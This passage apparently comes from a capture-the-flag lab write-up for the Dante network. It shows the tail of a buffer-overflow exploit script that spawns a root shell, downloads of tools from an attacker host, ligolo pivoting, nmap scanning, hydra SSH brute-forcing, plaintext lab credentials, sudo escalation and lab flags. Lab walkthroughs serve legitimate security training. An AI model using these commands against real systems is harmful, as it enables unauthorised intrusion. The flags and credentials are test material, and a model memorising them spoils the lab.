                    print(out.decode('utf-8', errors='ignore'))
                    
                    # Try to spawn an interactive shell
                    print("\n[+] Attempting to spawn interactive shell...")
                    try:
                        proc2 = subprocess.Popen(
                            [binary, payload],
                            stdin=sys.stdin,
                            stdout=sys.stdout,
                            stderr=sys.stderr,
                            env={}
                        )
                        proc2.wait()
                    except:
                        pass
                    
                    sys.exit(0)
                    
                elif b"SHELL_TEST" in out:
                    print(f"[+] Found potential shell at {hex(ret_addr)} but not root yet")
                    success_count += 1
                    
            except subprocess.TimeoutExpired:
                # If it hangs, we might have a shell
                print(f"[+] Possible shell at {hex(ret_addr)} (timeout)")
                proc.kill()
                continue
                
    except Exception as e:
        # Silent fail for most errors
        continue

print("\n[-] Exploit failed - tried all addresses")
print(f"[+] Found {success_count} potential shells but none were root")

Retrieved flag.txt in /root directory.
```

Transfered the file onto the target system and ran it.

```
wget http://10.10.14.70/exploit.py exploit.py
```

Gave it executable permissions and ran it & gained root shell.

```
chmod +x exploit.py
python3 exploit.py
```

Retrieved flag.txt in /root directory.

```
DANTE{0verfl0wing_l1k3_craz33!}
```

---
## Host Discovery

Proceeded with ping sweeping to potentially find new hosts.

Transfered an tool called "fping" to the target server in order to ping sweep efficiently.

```
wget http://10.10.14.70/fping fping
```

Gave it executable permissions.

```
chmod +x fping
```

Ran it & discovered another endpoint on 172.16.2.6

```
./fping -a -g 172.16.2.0/24 2>/dev/null
```

Let's perform the fourth pivot.

Transfered ligolo agent binary onto the target server & gave it executable permissions.

```
wget http://10.10.14.70/linux_agent linux_agent
chmod +x linux_agent
```

Started up proxy interface on local machine.

```
sudo ip tuntap add user saitama mode tun ligolo-quad && sudo ip link set ligolo-quad up && ligolo-proxy -selfcert -laddr 0.0.0.0:11604
```

Started reverse connection from target to my proxy.

```
./linux_agent -connect 10.10.14.70:11604 -ignore-cert
```

Started tunnel on proxy interface

```
session
start --tun ligolo-quad
```

Added route.

```
ip route add 172.16.2.6 dev ligolo-quad
```

---
# 172.16.2.6

The nmap scan revealed the following information about the target server.

```
nmap -n -Pn -sSCV -p- -oA nmap/target 172.16.2.6       
Starting Nmap 7.99 ( https://nmap.org ) at 2026-07-28 20:03 -0500
Nmap scan report for 172.16.2.6
Host is up (0.10s latency).
Not shown: 65534 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 5e:2d:0a:23:be:68:85:ef:a7:63:90:eb:3e:78:c1:fe (RSA)
|_  256 0a:a8:21:b8:fe:f2:60:d1:c9:d1:05:32:79:b0:cb:99 (ECDSA)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 197.47 seconds
```

Only SSH seems to be open. Let's bruteforce with all our credentials again!

```
hydra -L users.txt -P passwords.txt ssh://172.16.2.6
```

Successfully authenticated as user julian again! Let's connect to the target machine.

```
ssh julian@172.16.2.6
```

The Host Machine is "DANTE-ADMIN-NIX06".

Retrieved flag.txt in /home/james Desktop.

```
DANTE{H1ding_1n_th3_c0rner}
```

Found an interesting file called "SQL" in user james Desktop. It provides us new user credentials.

```
Sophie:TerrorInflictPurpleDirt996655
```
## Privilege Escalation

Enumerated users and found about another user called "plongbottom".

```
cat /etc/passwd
```

We enumerated this user already! In the LibreOffice File. Do his credentials work? Let's check.

```
plongbottom:PowerfixSaturdayClub777
```

```
su plongbottom
```

It worked we authenticated!

Enumerated that he is part of the sudo group.

```
id
```

Gained Root Shell

```
sudo su
```

Retrieved flag.txt in /root directory.

```
DANTE{Alw4ys_check_th053_group5}
```

Since the file "SQL" hints that we can use these credentials to authenticate on DANTE-SQL01 & the other retrieved credentials out of the Jenkins.bat file hint that we can exploit the jenkins website on 172.16.1.19. It means our job is done for now. Let's move to these targets now!

```

```



```

```



```

```



```

```